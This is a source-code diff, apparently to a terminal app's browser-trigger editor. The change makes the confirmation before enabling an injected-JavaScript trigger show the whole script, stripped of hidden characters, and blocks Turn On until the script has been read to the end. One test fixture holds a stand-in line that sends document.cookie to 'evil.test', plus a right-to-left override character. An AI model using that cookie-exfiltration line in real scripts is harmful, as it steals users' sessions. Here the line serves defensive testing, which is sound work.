@@ -290,8 +290,10 @@ fn needs_confirm(class: &str) -> bool {
 }
 
 /// What turning this trigger on will do, shown in the one confirm (None: no confirm). Every
-/// stored text goes through `display_text`, bounded.
-pub fn enable_warning(t: &Trigger) -> Option<String> {
+/// stored text goes through `display_text`, bounded. An Inject script is not in this text: the
+/// confirm shows all of it (`enable_script`) and Turn On waits until it was read to the end. An
+/// Enter Workgroup names the workgroup it enters (`workgroups`: (id, name)).
+pub fn enable_warning(t: &Trigger, workgroups: &[(String, String)]) -> Option<String> {
     if !needs_confirm(&t.action) {
         return None;
     }
@@ -299,15 +301,24 @@ pub fn enable_warning(t: &Trigger) -> Option<String> {
     let title = triggers::browser_action_info(&t.action).map_or("this action", |a| a.title);
     let on = match t.match_type {
         triggers::PAGE_CONTENT_REGEX => format!("every page whose URL matches /{}/ and whose text matches /{}/", shown(&t.regex, 200), shown(t.extra.get(CONTENT_REGEX_KEY).and_then(|v| v.as_str()).unwrap_or(""), 200)),
+        _ if t.regex.is_empty() => "every page".to_string(),
         _ => format!("every page whose URL matches /{}/", shown(&t.regex, 200)),
     };
     let what = match t.action.as_str() {
-        "InjectJavascriptContentTrigger" | "InjectJavascriptURLTrigger" => format!("run this JavaScript inside the page: {}", shown(&t.parameter, 600)),
+        "InjectJavascriptContentTrigger" | "InjectJavascriptURLTrigger" => format!("run the JavaScript below ({} characters, all of it shown) inside the page", t.parameter.chars().count()),
         "ReloadBrowserTrigger" => format!("reload the page after {} seconds, again each time it matches", shown(&t.parameter, 40)),
-        "iTermEnterWorkgroupBrowserTrigger" => "enter a workgroup".to_string(),
+        "iTermEnterWorkgroupBrowserTrigger" => format!("enter the workgroup \u{201c}{}\u{201d} and start what it starts", triggers::enter_workgroup_label(&t.parameter, workgroups)),
         _ => "exit the workgroup".to_string(),
     };
     Some(format!("{title} will {what}, on {on}. Turn it on only if you wrote it or trust where it came from."))
+}
+
+/// The whole script an Inject Javascript trigger would run, as the person reads it (hidden and
+/// bidirectional characters dropped, line breaks kept), for the confirm's scroll area. None for any
+/// other action.
+pub fn enable_script(t: &Trigger) -> Option<String> {
+    matches!(triggers::browser_action_info(&t.action).map(|a| a.class), Some("InjectJavascriptContentTrigger" | "InjectJavascriptURLTrigger"))
+        .then(|| crate::inert_files::display_text(&t.parameter, triggers::MAX_PARAMETER, true))
 }
 
 /// A browser trigger's list row: `/url regex/ /content regex/ Action parameter`; Instant does not
@@ -844,10 +855,13 @@ pub fn editor(ui: &mut egui::Ui, profile: &mut Profile, workgroups: &[(String, S
                     }
                     let was = t.enabled;
                     if ui.checkbox(&mut t.enabled, "Enabled").changed() {
-                        if !was && enable_warning(t).is_some() {
+                        if !was && enable_warning(t, workgroups).is_some() {
                             // Turning on a script, reload or workgroup trigger asks first; nothing runs here.
                             t.enabled = false;
-                            ui.data_mut(|d| d.insert_temp(confirm_id, i));
+                            ui.data_mut(|d| {
+                                d.insert_temp(confirm_id, i);
+                                d.remove::<usize>(egui::Id::new("trigger-confirm-read"));
+                            });
                         } else {
                             changed = true;
                         }
@@ -857,18 +871,34 @@ pub fn editor(ui: &mut egui::Ui, profile: &mut Profile, workgroups: &[(String, S
             });
             // The one confirm: what the trigger will do, and Turn On or Cancel.
             if ui.data(|d| d.get_temp::<usize>(confirm_id)) == Some(i) {
-                match enable_warning(t) {
+                let read_id = egui::Id::new("trigger-confirm-read");
+                match enable_warning(t, workgroups) {
                     Some(text) => {
                         ui.group(|ui| {
                             ui.colored_label(egui::Color32::from_rgb(0xff, 0xb0, 0x40), text);
+                            // The whole script, scrollable; Turn On waits until its end was in view.
+                            let mut read = true;
+                            if let Some(script) = enable_script(t) {
+                                let out = egui::ScrollArea::vertical().id_salt("trigger-confirm-script").max_height(200.0).auto_shrink([false, true]).show(ui, |ui| ui.add(egui::Label::new(egui::RichText::new(script).monospace()).wrap()));
+                                let at_end = out.state.offset.y + out.inner_rect.height() + 1.0 >= out.content_size.y;
+                                if at_end {
+                                    ui.data_mut(|d| d.insert_temp(read_id, i));
+                                }
+                                read = ui.data(|d| d.get_temp::<usize>(read_id)) == Some(i);
+                                if !read {
+                                    ui.weak("Scroll to the end of the script to turn it on.");
+                                }
+                            }
                             ui.horizontal(|ui| {
-                                if ui.button("Turn On").clicked() {
+                                if ui.add_enabled(read, egui::Button::new("Turn On")).clicked() {
                                     t.enabled = true;
                                     changed = true;
                                     ui.data_mut(|d| d.remove::<usize>(confirm_id));
+                                    ui.data_mut(|d| d.remove::<usize>(read_id));
                                 }
                                 if ui.button("Cancel").clicked() {
                                     ui.data_mut(|d| d.remove::<usize>(confirm_id));
+                                    ui.data_mut(|d| d.remove::<usize>(read_id));
                                 }
                             });
                         });
@@ -1031,17 +1061,30 @@ mod tests {
             let mut t = trig("", "", "iTerm2SharedARC.HighlightBrowserTrigger", "");
             pick_browser_action(&mut t, class, false, &[]);
             assert!(!t.enabled, "{class}");
-            assert!(enable_warning(&t).is_some(), "{class}");
+            assert!(enable_warning(&t, &[]).is_some(), "{class}");
         }
         let mut h = trig("", "", "iTerm2SharedARC.ReaderModeBrowserTrigger", "");
         pick_browser_action(&mut h, "iTerm2SharedARC.HighlightBrowserTrigger", false, &[]);
-        assert!(h.enabled && enable_warning(&h).is_none());
-        // The warning shows the script, bounded and without hidden characters.
-        let mut s = trig("", "^https://a/", "InjectJavascriptURLTrigger", &format!("alert(1);\u{202e}{}", "x".repeat(5000)));
+        assert!(h.enabled && enable_warning(&h, &[]).is_none());
+        // The warning never hides part of a script: the confirm's scroll area holds all of it (I1), without
+        // hidden characters and with its line breaks, and the text says how long it is.
+        let long = format!("// harmless\nalert(1);\u{202e}\n{}\nfetch('https://evil.test/' + document.cookie);", "x".repeat(5000));
+        let mut s = trig("", "^https://a/", "InjectJavascriptURLTrigger", &long);
         s.match_type = 1;
-        let w = enable_warning(&s).unwrap();
-        assert!(w.contains("alert(1);") && w.contains("^https://a/") && !w.contains('\u{202e}'));
-        assert!(w.chars().count() < 1500);
+        let w = enable_warning(&s, &[]).unwrap();
+        assert!(w.contains("^https://a/") && !w.contains('\u{202e}') && w.chars().count() < 1500);
+        assert!(w.contains(&format!("{} characters, all of it shown", long.chars().count())));
+        let script = enable_script(&s).unwrap();
+        assert!(script.contains("alert(1);\n") && script.ends_with("document.cookie);") && !script.contains('\u{202e}'), "the end of a long script is shown");
+        assert_eq!(script.chars().count(), long.chars().count() - 1, "only the hidden character is dropped");
+        assert!(enable_script(&trig("", "", "ReloadBrowserTrigger", "5")).is_none());
+        // Enter Workgroup names its target (I2); an empty regex reads as every page (M2).
+        let wg = vec![("id-1".to_string(), "Build\u{202e}box".to_string())];
+        let mut e = trig("", "", "iTermEnterWorkgroupBrowserTrigger", "id-1");
+        e.match_type = 1;
+        let ew = enable_warning(&e, &wg).unwrap();
+        assert!(ew.contains("\u{201c}Buildbox\u{201d}") && ew.contains("on every page."), "{ew}");
+        assert!(enable_warning(&e, &[]).unwrap().contains("(missing)"));
         // A hostile name or regex is shown through display_text.
         let mut n = trig("", "a\u{202e}b", "ReloadBrowserTrigger", "5");
         n.match_type = 1;
